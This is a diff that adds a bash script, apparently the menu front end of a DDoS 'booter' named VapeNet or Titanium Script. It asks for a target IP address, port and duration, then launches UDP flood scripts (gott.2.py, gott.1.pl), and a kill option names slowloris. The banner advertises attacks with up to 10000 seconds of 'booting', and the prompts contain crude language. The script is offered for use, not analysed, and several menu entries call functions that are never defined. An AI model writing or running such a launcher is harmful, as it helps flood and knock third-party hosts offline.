@@ -1,0 +1,163 @@
+#!/bin/bash
+BLACK='\e[0;30m'
+BLUE='\e[0;34m'
+GREEN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+PURPLE='\e[0;35m'
+BROWN='\e[0;33m'
+LIGHTGRAY='\e[0;37m'
+DARKGRAY='\e[1;30m'
+LIGHTBLUE='\e[1;34m'
+LIGHTGREEN='\e[1;32m'
+LIGHTCYAN='\e[1;36m'
+LIGHTRED='\e[1;31m'
+LIGHTPURPLE='\e[1;35m'
+YELLOW='\e[1;33m'
+WHITE='\e[0;37m'
+LWHITE='\e[1;37m'
+NC='\e[0m'              # No Color
+# Trap Signal Script
+#
+#TitaniumScript.bypass//BASH  Bypass.Function
+#load
+exit_script()
+{
+  echo "* * *Trap * * *"
+  ./m
+}
+
+dstat1()
+{
+    clear
+    echo -e " ${PURPLE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          WEED DSTAT                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+dstat
+    
+}
+
+admin12()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          ADMIN PANEL                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+echo "Im Sure You Can Create Your Own Panel :3"
+echo "If You Really Dont Know How You Can Contact Me On Skype"
+echo "Enter target ip BITCH :"
+read ip
+echo "Enter a Port Number  :"
+read port
+echo "Enter the time seconds :"
+read time
+python gott.2.py $ip $port $time
+}
+
+killall()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 4.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+pkill gott.1.pl
+pkill gott.2.py
+pkill gott.2.pl
+pkill gott.4.pl
+pkill slowloris
+}
+
+udp_flooda(){
+echo -en "Packets Ready
+Please Enter IP Address:"
+read ip
+echo -en "Please Enter Port:"
+read port
+echo -en "Please Enter Time:"
+read time
+python gott.2.py ${ip} ${port} ${time} 
+}
+
+udp_floodb(){
+echo -en "Fuck Yea
+Enter IP:"
+read ip
+echo -en "Enter Port:"
+read port
+echo -en "Enter Time:"
+read time
+perl gott.1.pl ${ip} ${port}  ${time}
+}
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear;clear
+echo -en "${RED}Coded By:${GREEN}NulledSkid      ${GREEN}MEMBERSHIP:${RED}4 MONTH  
+${GREEN}HMU ${RED}ON ${GREEN}INSTAGRAM ${RED}@NulledSkid
+ ${Red}                 	                                                                                                                             
+ 
+ _¦    ¦_     _¦¦¦¦¦¦¦¦    _¦¦¦¦¦¦¦_    _¦¦¦¦¦¦¦¦ 
+¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦ 
+¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¯  
+¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦  _¦¦¦___     
+¦¦¦    ¦¦¦ ¯¦¦¦¦¦¦¦¦¦¦¦ ¯¦¦¦¦¦¦¦¦¦¯  ¯¯¦¦¦¯¯¯     
+¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦          ¦¦¦    ¦_  
+¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦          ¦¦¦    ¦¦¦ 
+ ¯¦¦¦¦¦¦¯    ¦¦¦    ¦¯   _¦¦¦¦¯        ¦¦¦¦¦¦¦¦¦¦ 
+                                                  
+		Made By NulledSkid
+ 
+${GREEN}============================================
+${LIGHTBLUE}  VapeNet                                                      
+${RED}PRESS 1 TO HIT START AN ATTACK!              
+${GREEN}PRESS CTRL+C TO STOP HITTING THEM          
+${RED}MAX BOOTING TIME IS 10000 SECONDS             
+${LIGHTBLUE}SlapThaHoe              
+${GREEN}============================================
+${RED}#${USERNAME}-[RIP]:${GREEN}"
+    read yourch
+    case $yourch in
+      1) udp_flooda ;;
+      2) udp_floodb ;;
+	  3) killall ;;
+	  4) passwd ;;
+	  5) multi ;;
+	  6) dstat1 ;;
+	  7) and ;;
+	  8) admin12 ;;
+	  AI) autoinstall ;;
+      ex) echo "As you Command" ;  exit 1  ;;
+	  9) pkill menu  ;;
+      *) echo "Invalid Selection, Please make another selection between [1-11]" ;
+         echo "Press Enter. . ." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_input1
+#
+
+Take_input1
